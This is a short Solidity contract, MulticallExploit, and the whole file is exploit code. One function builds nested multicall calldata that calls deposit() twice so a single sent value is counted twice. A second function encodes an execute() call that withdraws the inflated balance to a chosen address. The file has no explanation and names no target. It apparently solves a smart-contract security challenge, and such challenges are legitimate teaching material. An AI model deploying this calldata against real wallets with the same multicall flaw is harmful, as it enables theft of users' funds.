// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MulticallExploit {
    function getExploitData() public pure returns (bytes[] memory) {
        // Create deposit selector
        bytes memory depositData = abi.encodeWithSignature("deposit()");
        
        // Create inner multicall with one deposit
        bytes[] memory innerCalls = new bytes[](1);
        innerCalls[0] = depositData;
        bytes memory multicallData = abi.encodeWithSignature("multicall(bytes[])", innerCalls);
        
        // Create outer multicall with deposit and nested multicall
        bytes[] memory outerCalls = new bytes[](2);
        outerCalls[0] = depositData;
        outerCalls[1] = multicallData;
        
        return outerCalls;
    }
    
    function getWithdrawData(address to, uint256 amount) public pure returns (bytes memory) {
        return abi.encodeWithSignature("execute(address,uint256,bytes)", to, amount, "");
    }
}